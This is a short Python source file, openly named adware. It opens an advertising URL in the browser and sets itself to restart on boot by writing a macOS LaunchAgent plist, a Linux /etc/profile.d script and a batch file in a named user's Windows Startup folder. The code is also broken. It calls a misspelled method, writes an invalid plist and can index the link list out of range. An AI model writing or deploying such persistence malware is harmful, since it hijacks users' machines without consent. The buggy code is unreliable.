import webbrowser
import platform
import os
import time

class adware:
    #changeable
    links = ["https://acceptable.a-ads.com/1610167"]
    pyCall = "py"
    i = 0;
    def __init__(self):
        self.persistence()
        self.openLink()
        self.wait()

    def persistance(self):
        if (platform.system() == "Darwin"):
            self.persistenceMac()
        elif (platform.system() == "Linux"):
            self.persistenceLinux()
        elif (platform.system() == "Windows"):
            self.persistenceWindows()

    def openLink(self):
        webbrowser.open(self.links[self.i])
        self.i += 1
        if self.i > len(self.links):
            self.i = 0

    def wait(self):
        #10 minutes
        time.sleep(10 * 60)

    def persistenceMac(self):
        #make plist
        plist = open("/Library/LaunchAgents/startup.plist", 'w')
        #write to plist
        plist.write("<key>Run</key>\n<array>\n\t<string>" + self.pyCall + "</string>\n\t<string>" + os.getcwd() + "</string>\n</array>")
        plist.close()

    def persistenceLinux(self):
        #make sh
        sh = open("/etc/profile.d/startup.sh", 'w')
        #write to plist
        sh.write(self.pyCall + ' ' + os.getcwd())
        sh.close();
        #make executable
        os.system("chmod +x " + os.getcwd())

    def persistenceWindows(self):
        #make bat
        bat = open("C:/Users/Jacob Krumholz/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startup.bat", 'w+')
        #write to plist
        bat.write(self.pyCall + ' \"' + __file__ + "\"")
        bat.close();

ads = adware()
